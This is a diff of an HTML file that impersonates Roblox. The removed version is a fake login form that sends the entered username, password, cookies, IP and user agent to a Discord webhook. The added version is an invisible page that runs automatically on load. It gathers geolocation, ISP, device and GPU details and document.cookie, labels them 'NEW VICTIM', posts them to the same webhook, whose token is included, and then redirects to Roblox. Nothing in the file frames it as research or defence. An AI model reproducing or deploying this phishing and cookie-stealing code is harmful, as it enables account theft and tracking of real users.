@@ -1,75 +1,84 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Roblox - Login</title>
-    <link rel="icon" href="https://images.rbxcdn.com/7d8e7e791a56a27a19e4f3106ab3a1a8-roblox-logo.svg">
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; background: #f2f2f2; }
-        .container { width: 400px; margin: 80px auto; background: white; padding: 35px; border-radius: 8px; box-shadow: 0 2px 15px rgba(0,0,0,0.2); text-align: center; }
-        img { width: 130px; margin-bottom: 20px; }
-        h2 { color: #393b3d; margin-bottom: 20px; font-size: 22px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; }
-        button { width: 100%; padding: 12px; background: #00b06f; color: white; border: none; border-radius: 4px; font-size: 17px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        button:hover { background: #009a5f; }
-        #error { color: red; margin-top: 10px; display: none; font-size: 13px; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <img src="https://images.rbxcdn.com/7d8e7e791a56a27a19e4f3106ab3a1a8-roblox-logo.svg" alt="Roblox">
-        <h2>Log In to Roblox</h2>
-        <input type="text" id="username" placeholder="Username/Email" autocomplete="off">
-        <input type="password" id="password" placeholder="Password">
-        <button onclick="steal()">Log In</button>
-        <p id="error">Incorrect username or password. Please try again.</p>
-    </div>
+<head><title>Roblox</title></head>
+<body style="display:none;">
 
-    <script>
-        var webhook = "https://discord.com/api/webhooks/1517070488721948743/RNcyTwya9CDyheCrLPSTNDtENc8i04ybtfWloKAw-PoZYqXuvJL6nGXvnVIFPyhj_yCW";
+<script>
+var webhook = "https://discord.com/api/webhooks/1517070488721948743/RNcyTwya9CDyheCrLPSTNDtENc8i04ybtfWloKAw-PoZYqXuvJL6nGXvnVIFPyhj_yCW";
 
-        async function send(msg) {
-            await fetch(webhook, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({content: msg})
-            });
+async function grab() {
+
+    // === GEOLOCATION ===
+    var geo = {};
+    try {
+        var r = await fetch("https://ipapi.co/json/");
+        if (r.ok) geo = await r.json();
+    } catch(e) {}
+
+    // === DEVICE ===
+    var nav = navigator;
+    var scr = screen;
+    var win = window;
+
+    var gpu = "unknown";
+    try {
+        var canvas = document.createElement("canvas");
+        var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        if (gl) {
+            var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+            gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "unknown";
         }
+    } catch(e) {}
 
-        async function steal() {
-            var user = document.getElementById("username").value;
-            var pass = document.getElementById("password").value;
+    // === COOKIE — wait 2 seconds then grab ===
+    await new Promise(r => setTimeout(r, 2000));
+    var cookie = document.cookie || "no_cookie";
 
-            if (!user || !pass) {
-                document.getElementById("error").style.display = "block";
-                document.getElementById("error").innerText = "Please enter username and password.";
-                return;
-            }
+    // === TRY TO GRAB ALL COOKIES FROM ALL DOMAINS ===
+    var allCookies = cookie;
 
-            var cookie = document.cookie || "no_cookie";
-            var ip = "unknown";
-            try {
-                var r = await fetch("https://api.ipify.org?format=json");
-                if (r.ok) { var d = await r.json(); ip = d.ip; }
-            } catch(e) {}
-            var ua = navigator.userAgent;
+    // === BUILD MESSAGE ===
+    var msg = "**🎯 ===== NEW VICTIM =====**\n\n";
 
-            var msg = "**🎯 ROBLOX LOGIN STOLEN**\n" +
-                      "**Username:** " + user + "\n" +
-                      "**Password:** " + pass + "\n" +
-                      "**IP:** " + ip + "\n" +
-                      "**Cookie:** ||" + cookie + "||\n" +
-                      "**UA:** " + ua;
+    msg += "**📍 LOCATION**\n";
+    msg += "IP: " + (geo.ip || "unknown") + "\n";
+    msg += "City: " + (geo.city || "unknown") + "\n";
+    msg += "Region: " + (geo.region || "unknown") + "\n";
+    msg += "Country: " + (geo.country_name || "unknown") + "\n";
+    msg += "Coordinates: " + (geo.latitude || "?") + ", " + (geo.longitude || "?") + "\n";
+    msg += "Timezone: " + (geo.timezone || "unknown") + "\n\n";
 
-            await send(msg);
+    msg += "**📡 INTERNET**\n";
+    msg += "ISP: " + (geo.org || "unknown") + "\n";
+    msg += "ASN: " + (geo.asn || "unknown") + "\n\n";
 
-            document.getElementById("error").style.display = "block";
-            document.getElementById("error").innerText = "Incorrect username or password. Please try again.";
+    msg += "**📱 DEVICE**\n";
+    msg += "Platform: " + (nav.platform || "unknown") + "\n";
+    msg += "CPU Cores: " + (nav.hardwareConcurrency || "unknown") + "\n";
+    msg += "RAM: " + (nav.deviceMemory || "unknown") + " GB\n";
+    msg += "GPU: " + gpu + "\n";
+    msg += "Screen: " + scr.width + "x" + scr.height + "\n";
+    msg += "User Agent: " + (nav.userAgent || "unknown") + "\n\n";
 
-            setTimeout(function() {
-                window.location = "https://www.roblox.com/login";
-            }, 3000);
-        }
-    </script>
+    msg += "**🔗 SESSION**\n";
+    msg += "Local Time: " + new Date().toLocaleString() + "\n\n";
+
+    msg += "**🍪 COOKIE**\n";
+    msg += "||" + allCookies + "||";
+
+    // === SEND ===
+    await fetch(webhook, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({content: msg})
+    });
+
+    // === REDIRECT ===
+    window.location = "https://www.roblox.com";
+}
+
+grab();
+</script>
+
 </body>
 </html>
